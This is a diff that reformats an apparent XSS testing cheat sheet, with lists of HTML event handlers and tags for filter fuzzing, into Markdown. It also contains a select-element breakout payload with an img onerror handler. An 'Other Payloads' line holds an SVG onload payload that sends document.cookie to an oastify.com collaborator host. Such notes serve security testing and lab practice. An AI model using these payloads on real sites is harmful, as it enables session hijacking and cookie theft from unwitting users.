@@ -1,4 +1,5 @@
-// Events
+# Events
+```
 autofocus
 onanimationend
 onanimationiteration
@@ -53,8 +54,10 @@ onwebkitanimationiteration
 onwebkitanimationstart
 onwebkittransitionend
 onresize
+```
 
-// Tags
+# Tags
+```
 a
 a2
 abbr
@@ -211,8 +214,9 @@ animate
 animatemotion
 animatetransform
 set
+```
 
-/*
+``` js
 // XSS in a select statement used by location search
 "></select><img%20src=1%20onerror=alert()>
 
@@ -291,5 +295,4 @@ function handleResponse() {
 
 Other Payloads
 '"><svg/onload=fetch(`//qlftakffg8o6sfso6idpv5k80z6qugi5.oastify.com/cookie?=${encodeURIComponent(document.cookie)}`)>
-
-*/
+```
